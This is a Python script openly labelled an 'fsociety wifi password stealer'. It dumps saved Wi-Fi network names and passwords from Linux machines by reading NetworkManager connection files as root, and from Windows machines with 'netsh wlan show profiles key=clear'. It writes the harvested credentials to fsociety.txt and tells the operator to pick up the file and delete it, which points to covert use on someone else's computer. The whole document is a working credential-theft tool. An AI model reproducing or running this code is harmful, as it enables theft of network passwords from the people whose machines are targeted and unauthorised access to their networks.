# cross platform  wifi password stealer 
# mac_os to be added :)
# fsociety wifi password stealer ;)

from subprocess import run
import platform 
import os
import re
import sys
def systemOS():
	os = platform.system()

	return os


def linux():
	if os.getuid() != 0:
		sys.exit('[-] run this with sudo permissions! ')
	alldata = []
	files = os.listdir('/etc/NetworkManager/system-connections/')
	for file in files:
		with open(f'/etc/NetworkManager/system-connections/{file}', 'r', encoding='latin1') as d:
			data = d.read() 
			pattern = re.compile(R'psk=.+')
			passwords = pattern.findall(data)
			ssidandpasswords = str(f"SSID={file}, {''.join(passwords)}.".replace('.nmconnection', '').replace('psk=','password='))
			print(ssidandpasswords)
			alldata.append(ssidandpasswords)
			datafile = open('fsociety.txt' ,'w')
			datalog = datafile.write(str('\n'.join(alldata)))
	m = open('fsociety.txt', 'a')
	msg = m.write('\n\n[*] there is an extra dot in the end of everypassword') 
	print('\t')
	print("[*] ssid's and passwords are saved in (fsociety.txt) file pickit up and delete it ;)")
	print('[*] there is an extra dot in the end of everypassword')




def windows():
	alldata = []
	profiles = run(['netsh' ,'wlan', 'show' ,'profiles'], capture_output=True).stdout.decode()
	pattern = re.compile(R"All User Profile     : (.*)\r")
	all_ssid = pattern.findall(profiles)
	for ssid in all_ssid:
		command2 = run(['netsh' ,'wlan', 'show' ,'profiles', ssid, 'key=clear'], capture_output=True).stdout.decode()
		pattern = re.compile(R'Key Content            : (.*)\r')
		passwords = pattern.findall(command2)
		ssidandpasswords = f"SSID={ssid}, password={''.join(passwords)}"
		print(ssidandpasswords)
		alldata.append(ssidandpasswords)
		datafile = open('fsociety.txt' ,'w')
		datalog = datafile.write(str('\n'.join(alldata))) 
	print('\t')
	print("[*] ssid's and passwords are saved in (fsociety.txt) file pickit up and delete it ;)")





if systemOS() == 'Windows':
	print('[*] operating system: WINDWOS ')
	print('\t')
	windows()

if systemOS() == 'Linux':
	print('[*] operating system: LINUX ')
	print('\t')
	linux()


